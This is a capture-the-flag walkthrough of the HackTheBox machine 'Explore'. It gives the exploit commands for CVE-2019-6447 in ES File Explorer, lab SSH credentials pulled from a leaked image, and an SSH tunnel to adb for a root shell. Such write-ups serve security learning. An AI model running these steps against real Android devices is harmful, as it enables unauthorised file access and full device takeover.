# Explore

## Discovery

`nmap` delivers yet again:

```
1900/udp open|filtered upnp
5353/udp open|filtered zeroconf
```

```
2222/tcp  open     ssh     (protocol 2.0)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
44733/tcp open     unknown
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
```

Googling for the port 59777 tells a different story: `ES File Explorer` serves
all the files over HTTP!

We test with manual urls like `http://10.10.10.247:59777/etc/hosts` and get:

- "Error 404, file not found." when the file / directory doesn't exist
- "FORBIDDEN: No directory listing." on existing directories
- status 200 on existing files

In other words we get file & directory enumeration.

Even more, there is a cve on this app: the "ES File Explorer" has an API with
listing functionalities. We don't need no wordlist!

And there are ready-made scripts, for example [Nehal Zaman][cve-2019-6447-script] made a great
Python script with all the functions:

```python
cmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']
```

Reading through it, we can actually run a simple curl command:

```bash
curl -X $'POST' -H $'Content-Type: application/json' \
    --data $'{"command": "listFiles"}' \
    $'http://10.10.10.247:59777/'
```

This allows us to list subfolders too and make more precise requests. With this,
we comb the phone and quickly find a picture with credentials:

![][credential-leak-picture]

> kristi Kr1sT!5h@Rp3xPl0r3!

These work on the ssh server and it's enough to recover the user flag at:

> /mnt/sdcard/user.txt

## Escalation

The app `freeciv` is known to open a debugging port for adb: 5555.

It is filtered from the WAN but accessible from localhost.
So we use ssh to create a tunnel from the local port 5555 to the remote port 5555:

```bash
ssh -p 2222 -L 5555:localhost:5555 kristi@explore.htb
```

Then connect with adb:

```bash
adb connect localhost:5555
```

And `adb shell` forwards the connection to the remote port 5555.
And adb can impersonate root:

```bash
x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),...
x86_64:/ $ su
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
```

We locate the flag with:

```bash
find / -name root.txt
```

> http://10.10.10.247:59777/data/root.txt

[credential-leak-picture]: images/creds.jpg
[cve-2019-6447-script]: https://www.exploit-db.com/exploits/50070
